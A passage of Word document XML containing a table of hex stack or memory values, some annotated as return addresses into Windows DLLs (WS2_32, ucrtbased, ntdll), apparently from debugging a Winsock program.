          </w:p>
          <w:p w14:paraId="51FE9ED2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>161</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="301FCB29" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>162</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EC1BAD0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>163</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79288C02" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>164</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23902FC0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>165</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D849883" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>166</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12DBC989" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>167</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14CF4EA2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>168</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="700869BA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>169</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DCCEC59" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>170</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0993DBD7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>171</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="086581DA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5202" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="39334B42" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="3434"/>
              </w:tabs>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>75F56C19</w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> -&gt; WS2_32.dll -&gt; Offset: 6C19</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FDAEC41" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00214360</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA66C2F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6790F035" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E5C16BE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE149AB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00214778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76D40C5F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FFFFFFFF</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FEB7E0A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01203208</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="484F2444" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F2F2E5B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F670</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="701210E1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="001E6DF2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01201181</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A6C871A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00214778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2087AE0A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F698</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="102C8356" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0120123A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16B73B95" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00214778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E758598" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000064</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D92D01D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1446D5B5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>75F537AD</w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> -&gt; WS2_32.dll -&gt; Offset: 37AD</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C814D2D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000068</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="077AC20B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F694</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B72DBDE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00214778</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50698C25" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000004</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C323FA1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>4315F864</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EBFFBAD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0015F864</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1626DCD0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>01201B57</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF1DD8B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0020ABB0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38CD105D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>6CBAE76C</w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> -&gt; ucrtbased.dll -&gt; Offset: CE76C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DF984CC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFD3000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="586844C0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33224DE5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>5C110002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4613235B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="674039BD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25F40624" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>FFFFFFFE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D9C5DEF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>F0B70002</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12CC5EE9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0B02000A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4561D641" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55654BA3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A1385C1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>02020202</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49FF1946" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>536E6957</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A797C4D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>206B636F</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01A28911" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00302E32</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="537104A7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">77A89E37 </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>-&gt; ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31CC4C58" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05998A76" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>50000063</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E619713" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">77A56360 </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>-&gt; ntdll.dll</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30ED954F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>77BED47B</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2585D6A3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A87E403" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00200000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A4314CA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0020AFF0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A817116" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
